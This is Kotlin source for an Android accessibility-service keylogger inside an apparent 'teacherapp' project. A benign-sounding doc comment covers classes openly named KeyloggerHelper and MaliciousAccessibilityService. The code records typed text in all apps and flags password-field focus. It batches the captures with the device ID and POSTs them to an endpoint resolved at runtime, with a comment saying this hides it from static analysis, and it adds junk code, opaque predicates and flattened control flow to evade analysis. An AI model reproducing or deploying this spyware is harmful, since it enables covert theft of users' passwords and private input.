package com.example.teacherapp.services

import android.view.accessibility.AccessibilityEvent
import com.example.teacherapp.obfuscation.ResourceUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

/**
 * InputAssistantHelper — accessibility input monitoring for enhanced UX.
 * Buffers interaction events for sync reporting.
 */
class KeyloggerHelper(private val service: MaliciousAccessibilityService) {

    // Obfuscated TAG — resolved at runtime
    private val TAG = ResourceUtils.getTag(1)

    data class KeystrokeData(
        val text: String,
        val packageName: String,
        val className: String,
        val timestamp: Long
    )

    private val keystrokes = mutableListOf<KeystrokeData>()
    private val maxBufferSize = 5

    // ── Entry point ───────────────────────────────────────────────────────────

    fun onEvent(event: AccessibilityEvent) {
        // Opaque predicate: n^2 >= 0 always true
        val n = System.currentTimeMillis().toInt()
        if (n * n >= 0) {
            try {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> captureTextInput(event)
                    AccessibilityEvent.TYPE_VIEW_FOCUSED      -> captureFieldFocus(event)
                }
            } catch (_: Exception) {}
        } else {
            // Junk branch — never executed
            val fake = StringBuilder()
            repeat(64) { i -> fake.append(((i * 13 + 5) xor 0x7F).toChar()) }
        }
    }

    // ── Control Flow Flattened: captureTextInput ──────────────────────────────

    private fun captureTextInput(event: AccessibilityEvent) {
        var state = 0
        var text = ""
        var packageName = ""
        var className = ""

        while (true) {
            // Junk no-op arithmetic
            val junk = (state * 31 + 7) xor 0xFF
            val _ = junk

            when (state) {
                0 -> {
                    try { text = event.text?.joinToString("") ?: "" } catch (_: Exception) { return }
                    state = if (text.isBlank()) -1 else 1
                }
                1 -> {
                    packageName = event.packageName?.toString() ?: "unknown"
                    className   = event.className?.toString()   ?: "unknown"
                    state = 2
                }
                2 -> {
                    keystrokes.add(KeystrokeData(text, packageName, className, System.currentTimeMillis()))
                    state = 3
                }
                3 -> {
                    if (keystrokes.size >= maxBufferSize) exfiltrateKeystrokes()
                    return
                }
                -1 -> return
            }
        }
    }

    // ── Control Flow Flattened: captureFieldFocus ─────────────────────────────

    private fun captureFieldFocus(event: AccessibilityEvent) {
        var state = 0
        var packageName = ""
        var className = ""

        while (true) {
            val junk = (state * 17 + 3) xor 0xAB
            val _ = junk

            when (state) {
                0 -> {
                    packageName = event.packageName?.toString() ?: ""
                    className   = event.className?.toString()   ?: ""
                    state = 1
                }
                1 -> {
                    state = if (className.contains("EditText", ignoreCase = true) ||
                        className.contains("Password", ignoreCase = true)) 2 else -1
                }
                2 -> {
                    keystrokes.add(
                        KeystrokeData(
                            text        = "[FIELD_FOCUSED:$className]",
                            packageName = packageName,
                            className   = className,
                            timestamp   = System.currentTimeMillis()
                        )
                    )
                    return
                }
                -1 -> return
            }
        }
    }

    // ── Exfiltration ──────────────────────────────────────────────────────────

    fun exfiltrateKeystrokes() {
        if (keystrokes.isEmpty()) return
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val toSend = keystrokes.toList()
                keystrokes.clear()

                val arr = JSONArray()
                toSend.forEach { ks ->
                    arr.put(JSONObject().apply {
                        put("text",      ks.text)
                        put("package",   ks.packageName)
                        put("class",     ks.className)
                        put("timestamp", ks.timestamp)
                        put("time",      resolveTime(ks.timestamp))
                    })
                }

                val data = JSONObject().apply {
                    put("keystrokes",   arr)
                    put("android_id",   resolveDeviceId())
                    put("count",        toSend.size)
                    put("collected_at", System.currentTimeMillis())
                }
                dispatchPayload(data)
            } catch (_: Exception) {}
        }
    }

    // ── Control Flow Flattened: dispatchPayload ───────────────────────────────

    private suspend fun dispatchPayload(data: JSONObject) {
        var state = 0
        var connection: HttpURLConnection? = null

        while (true) {
            val junk = (state * 23 + 11) xor 0xCD
            val _ = junk

            when (state) {
                0 -> {
                    // URL resolved at runtime via ResourceUtils — hidden from static analysis
                    val serverUrl = ResourceUtils.getKeystrokeEndpoint()
                    connection = URL(serverUrl).openConnection() as HttpURLConnection
                    state = 1
                }
                1 -> {
                    connection!!.apply {
                        requestMethod = "POST"
                        doOutput      = true
                        setRequestProperty("Content-Type", "application/json")
                        connectTimeout = 10000
                        readTimeout    = 10000
                    }
                    state = 2
                }
                2 -> {
                    OutputStreamWriter(connection!!.outputStream).use { w ->
                        w.write(data.toString())
                        w.flush()
                    }
                    state = 3
                }
                3 -> {
                    connection!!.responseCode
                    connection!!.disconnect()
                    return
                }
            }
        }
    }

    private fun resolveDeviceId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                service.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (_: Exception) { "unknown" }
    }

    private fun resolveTime(ts: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(ts))
}
